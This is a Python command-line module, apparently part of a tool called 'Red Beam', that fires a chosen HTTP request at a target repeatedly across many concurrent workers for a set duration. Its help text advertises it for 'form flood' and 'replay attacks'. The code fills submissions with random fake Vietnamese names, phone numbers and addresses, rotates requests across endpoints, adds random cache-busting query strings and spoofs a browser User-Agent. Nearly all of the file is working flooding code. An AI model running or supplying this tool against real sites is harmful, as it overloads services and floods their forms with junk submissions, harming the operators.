import asyncio
import json
import random
import string
import threading
import time
from dataclasses import dataclass, field
from urllib.parse import urlparse

import aiohttp
import click
from rich.console import Console
from rich.live import Live
from rich.panel import Panel
from rich.table import Table

console = Console()


@dataclass
class Stats:
    total_sent: int = 0
    total_success: int = 0
    total_fail: int = 0
    bytes_sent: int = 0
    start_time: float = field(default_factory=time.time)
    _lock: threading.Lock = field(default_factory=threading.Lock)
    _per_second: list = field(default_factory=list)
    peak_rps: int = 0
    status_codes: dict = field(default_factory=dict)

    def hit(self, success=True, nbytes=0, status_code=0):
        with self._lock:
            self.total_sent += 1
            self.bytes_sent += nbytes
            if success:
                self.total_success += 1
            else:
                self.total_fail += 1
            if status_code:
                self.status_codes[status_code] = self.status_codes.get(status_code, 0) + 1
            self._per_second.append(time.time())

    def snapshot_rps(self):
        with self._lock:
            now = time.time()
            self._per_second = [t for t in self._per_second if now - t < 1.0]
            rps = len(self._per_second)
            if rps > self.peak_rps:
                self.peak_rps = rps
            return rps

    @property
    def elapsed(self):
        return time.time() - self.start_time

    @property
    def avg_rps(self):
        e = self.elapsed
        return self.total_sent / e if e > 0 else 0


def rand_str(n):
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))


def build_dashboard(stats, target, method, threads, duration):
    elapsed = stats.elapsed
    remaining = max(0, duration - elapsed)
    rps = stats.snapshot_rps()
    pct = min(elapsed / duration, 1.0) if duration > 0 else 0
    bar_w = 30
    filled = int(bar_w * pct)
    bar = f"[red]{'█' * filled}[/][dim]{'░' * (bar_w - filled)}[/] {pct*100:.0f}%"

    t = Table(show_header=False, box=None, padding=(0, 2))
    t.add_column(style="bold cyan", width=16)
    t.add_column(style="white")
    t.add_row("Target", f"[bold yellow]{target}[/]")
    t.add_row("Method", f"[bold magenta]{method}[/]")
    t.add_row("Threads", f"{threads}")
    t.add_row("Duration", f"{elapsed:.0f}s / {duration}s  [dim]({remaining:.0f}s left)[/]")
    t.add_row("", "")
    t.add_row("Requests/s", f"[bold green]{rps}[/]")
    t.add_row("Peak RPS", f"[bold green]{stats.peak_rps}[/]")
    t.add_row("Avg RPS", f"[bold]{stats.avg_rps:.0f}[/]")
    t.add_row("", "")
    t.add_row("Total Sent", f"[bold]{stats.total_sent:,}[/]")
    t.add_row("Success", f"[green]{stats.total_success:,}[/]")
    t.add_row("Failed", f"[red]{stats.total_fail:,}[/]")
    t.add_row("Data Sent", f"{stats.bytes_sent / 1024 / 1024:.1f} MB")

    with stats._lock:
        codes = dict(sorted(stats.status_codes.items()))
    if codes:
        code_str = " | ".join(f"{k}:{v}" for k, v in codes.items())
        t.add_row("HTTP Codes", f"[dim]{code_str}[/]")

    t.add_row("", "")
    t.add_row("Progress", bar)
    return Panel(t, title="[bold red]⚡ RED BEAM REPEAT ⚡[/]", border_style="red", padding=(1, 2))


def load_template_vars(template_file):
    with open(template_file) as f:
        return json.load(f)


def render_template_value(val, seq_id):
    if not isinstance(val, str):
        return val
    result = val
    while "{{rand_name}}" in result:
        first = random.choice(["Nguyen", "Tran", "Le", "Pham", "Hoang", "Vu", "Dang", "Bui", "Do", "Ngo"])
        last = random.choice(["Van", "Thi", "Minh", "Duc", "Anh", "Hoa", "Hai", "Thanh", "Hung", "Linh"])
        result = result.replace("{{rand_name}}", f"{first} {last}", 1)
    while "{{rand_phone}}" in result:
        prefix = random.choice(["090", "091", "093", "097", "098", "032", "033", "034", "035", "036"])
        result = result.replace("{{rand_phone}}", prefix + "".join(random.choices(string.digits, k=7)), 1)
    while "{{rand_email}}" in result:
        result = result.replace("{{rand_email}}", f"{rand_str(8)}@{rand_str(5)}.com", 1)
    while "{{rand_str}}" in result:
        result = result.replace("{{rand_str}}", rand_str(10), 1)
    while "{{rand_int}}" in result:
        result = result.replace("{{rand_int}}", str(random.randint(1, 99999)), 1)
    while "{{rand_addr}}" in result:
        num = random.randint(1, 999)
        street = random.choice(["Nguyen Hue", "Le Loi", "Tran Hung Dao", "Hai Ba Trung", "Pasteur", "Dong Khoi"])
        dist = random.choice(["Quan 1", "Quan 3", "Quan 5", "Quan 7", "Binh Thanh", "Go Vap", "Thu Duc"])
        result = result.replace("{{rand_addr}}", f"{num} {street}, {dist}, TP.HCM", 1)
    result = result.replace("{{seq}}", str(seq_id))
    return result


def render_body(body_template, seq_id):
    if isinstance(body_template, dict):
        rendered = {}
        for k, v in body_template.items():
            if isinstance(v, list):
                rendered[k] = [render_body(item, seq_id) if isinstance(item, dict) else render_template_value(item, seq_id) for item in v]
            elif isinstance(v, dict):
                rendered[k] = render_body(v, seq_id)
            else:
                rendered[k] = render_template_value(v, seq_id)
        return rendered
    elif isinstance(body_template, list):
        return [render_body(item, seq_id) if isinstance(item, (dict, list)) else render_template_value(item, seq_id) for item in body_template]
    elif isinstance(body_template, str):
        return render_template_value(body_template, seq_id)
    return body_template


def parse_raw_request(req_file):
    with open(req_file) as f:
        content = f.read()

    lines = content.split("\n")
    first_line = lines[0].strip()
    parts = first_line.split(" ", 2)
    method = parts[0]
    path = parts[1] if len(parts) > 1 else "/"

    headers = {}
    body_start = 0
    for i, line in enumerate(lines[1:], 1):
        stripped = line.strip()
        if not stripped:
            body_start = i + 1
            break
        if ":" in stripped:
            key, val = stripped.split(":", 1)
            headers[key.strip()] = val.strip()

    body = "\n".join(lines[body_start:]).strip() if body_start < len(lines) else ""
    return method, path, headers, body


async def repeat_worker(session, url, method, headers, body_template, stats, stop_event, seq_counter, rand_query, endpoints):
    while not stop_event.is_set():
        try:
            with seq_counter["lock"]:
                seq_id = seq_counter["val"]
                seq_counter["val"] += 1

            target_url = random.choice(endpoints) if endpoints else url
            if rand_query:
                sep = "&" if "?" in target_url else "?"
                target_url = f"{target_url}{sep}_={rand_str(8)}"

            if body_template is not None:
                rendered = render_body(body_template, seq_id)
                if isinstance(rendered, (dict, list)):
                    data = json.dumps(rendered)
                else:
                    data = str(rendered)
            else:
                data = None

            async with session.request(method, target_url, headers=headers, data=data,
                                       timeout=aiohttp.ClientTimeout(total=15), ssl=False) as r:
                resp_body = await r.read()
                nbytes = len(data.encode()) if data else 0
                is_success = 200 <= r.status < 400
                stats.hit(is_success, nbytes, r.status)
        except asyncio.CancelledError:
            break
        except Exception:
            stats.hit(False)
            await asyncio.sleep(0.01)


async def run_repeat_attack(url, method, headers, body_template, threads, duration, rand_query, endpoints):
    stats = Stats()
    stop_event = asyncio.Event()
    seq_counter = {"val": 0, "lock": threading.Lock()}

    connector = aiohttp.TCPConnector(limit=threads * 2, limit_per_host=threads * 2, ssl=False,
                                     force_close=False, enable_cleanup_closed=True)

    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [
            asyncio.create_task(
                repeat_worker(session, url, method, headers, body_template,
                              stats, stop_event, seq_counter, rand_query, endpoints)
            )
            for _ in range(threads)
        ]

        method_label = f"REPEAT {method}"
        with Live(build_dashboard(stats, url, method_label, threads, duration),
                  console=console, refresh_per_second=2) as live:
            start = time.time()
            while time.time() - start < duration:
                await asyncio.sleep(0.5)
                live.update(build_dashboard(stats, url, method_label, threads, duration))

        stop_event.set()
        for t in tasks:
            t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

    return stats


@click.command("repeat")
@click.argument("target")
@click.option("-X", "--method", "http_method", default="GET", show_default=True,
              help="HTTP method (GET/POST/PUT/DELETE/PATCH)")
@click.option("-H", "--header", "headers", multiple=True,
              help="Header 'Key: Value' (repeatable)")
@click.option("-B", "--body", default=None,
              help="Request body string (supports {{rand_name}}, {{rand_phone}}, etc.)")
@click.option("--body-file", default=None, type=click.Path(exists=True),
              help="JSON file with body template")
@click.option("--req-file", default=None, type=click.Path(exists=True),
              help="Raw HTTP request file (Burp format)")
@click.option("-e", "--endpoint", "endpoints", multiple=True,
              help="Additional endpoint URLs for round-robin (repeatable)")
@click.option("-t", "--threads", type=int, default=50, show_default=True,
              help="Concurrent workers")
@click.option("-d", "--duration", type=int, default=120, show_default=True,
              help="Duration in seconds")
@click.option("--rand-query", is_flag=True,
              help="Add random query param per request")
@click.option("--dry-run", is_flag=True,
              help="Send 1 request and show response, then exit")
def repeat_command(target, http_method, headers, body, body_file, req_file, endpoints, threads, duration, rand_query, dry_run):
    """Replay custom HTTP requests at high speed.

    \b
    Sends the same request repeatedly with optional randomized fields.
    Useful for form flood, API stress testing, and replay attacks.

    \b
    Template variables (auto-replaced per request):
      {{rand_name}}   - Random Vietnamese name
      {{rand_phone}}  - Random VN phone number
      {{rand_email}}  - Random email
      {{rand_addr}}   - Random VN address
      {{rand_str}}    - Random 10-char string
      {{rand_int}}    - Random integer 1-99999
      {{seq}}         - Sequential counter (0, 1, 2, ...)

    \b
    Examples:
      hot beam repeat https://api.example.com/form -X POST \\
        -H "Content-Type: application/json" \\
        -B '{"name":"{{rand_name}}","phone":"{{rand_phone}}"}' \\
        -t 100 -d 60

      hot beam repeat https://api.example.com/form \\
        --body-file payload.json -t 200 -d 300

      hot beam repeat https://target.com \\
        --req-file request.txt -t 50

      hot beam repeat https://api1.example.com/sendform \\
        -e https://api2.example.com/sendform \\
        -e https://api3.example.com/sendform \\
        --body-file payload.json -t 100 -d 120
    """
    req_headers = {}
    req_body_template = None
    req_method = http_method.upper()

    if req_file:
        req_method, path, file_headers, file_body = parse_raw_request(req_file)
        req_headers.update(file_headers)
        parsed = urlparse(target)
        if path and path != "/":
            target = f"{parsed.scheme}://{parsed.netloc}{path}"
        if file_body:
            try:
                req_body_template = json.loads(file_body)
            except json.JSONDecodeError:
                req_body_template = file_body

    for h in headers:
        if ":" in h:
            key, val = h.split(":", 1)
            req_headers[key.strip()] = val.strip()

    if body_file:
        with open(body_file) as f:
            req_body_template = json.load(f)
    elif body and not req_file:
        try:
            req_body_template = json.loads(body)
        except json.JSONDecodeError:
            req_body_template = body

    if not req_headers.get("User-Agent"):
        req_headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    endpoint_list = list(endpoints) if endpoints else []

    if dry_run:
        import requests as req_lib
        import urllib3
        urllib3.disable_warnings()

        console.print(f"\n[bold cyan]DRY RUN[/] - Sending 1 request to [yellow]{target}[/]\n")
        rendered = render_body(req_body_template, 0) if req_body_template else None
        if isinstance(rendered, (dict, list)):
            data = json.dumps(rendered, ensure_ascii=False, indent=2)
        elif rendered:
            data = str(rendered)
        else:
            data = None

        console.print(f"[bold]{req_method}[/] {target}")
        for k, v in req_headers.items():
            console.print(f"  [cyan]{k}:[/] {v}")
        if data:
            console.print(f"\n[bold]Body:[/]\n{data}\n")

        try:
            r = req_lib.request(req_method, target, headers=req_headers, data=data.encode() if data else None,
                                timeout=10, verify=False)
            console.print(f"[bold]Response:[/] {r.status_code}")
            for k, v in r.headers.items():
                console.print(f"  [dim]{k}:[/] {v}")
            console.print(f"\n[bold]Body:[/]\n{r.text[:2000]}")
        except Exception as e:
            console.print(f"[red]Error: {e}[/]")
        return

    display_target = target[:60] + "..." if len(target) > 60 else target
    console.print(f"\n[bold red]⚡ RED BEAM REPEAT[/] | {req_method} | {threads} threads | {duration}s")
    console.print(f"  Target: [yellow]{display_target}[/]")
    if endpoint_list:
        console.print(f"  Endpoints: [cyan]{len(endpoint_list) + 1}[/] (round-robin)")
    if req_body_template:
        console.print("  Body template: [green]loaded[/]")
    console.print()

    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        stats = loop.run_until_complete(
            run_repeat_attack(target, req_method, req_headers, req_body_template,
                              threads, duration, rand_query, endpoint_list)
        )
        loop.close()
    except KeyboardInterrupt:
        console.print("\n[yellow]Beam terminated[/]")
        return

    console.print("\n[bold red]⚡ BEAM REPEAT COMPLETE[/]")
    console.print(f"[dim]{'─' * 50}[/]")
    console.print(f"  Total:     [bold]{stats.total_sent:,}[/] requests")
    console.print(f"  Success:   [green]{stats.total_success:,}[/]")
    console.print(f"  Failed:    [red]{stats.total_fail:,}[/]")
    console.print(f"  Data Sent: {stats.bytes_sent / 1024 / 1024:.1f} MB")
    console.print(f"  Duration:  {stats.elapsed:.1f}s")
    console.print(f"  Avg RPS:   {stats.avg_rps:.0f}")
    console.print(f"  Peak RPS:  {stats.peak_rps}")
    with stats._lock:
        codes = dict(sorted(stats.status_codes.items()))
    if codes:
        console.print(f"  HTTP Codes: {' | '.join(f'{k}:{v}' for k, v in codes.items())}")
    console.print(f"[dim]{'─' * 50}[/]")
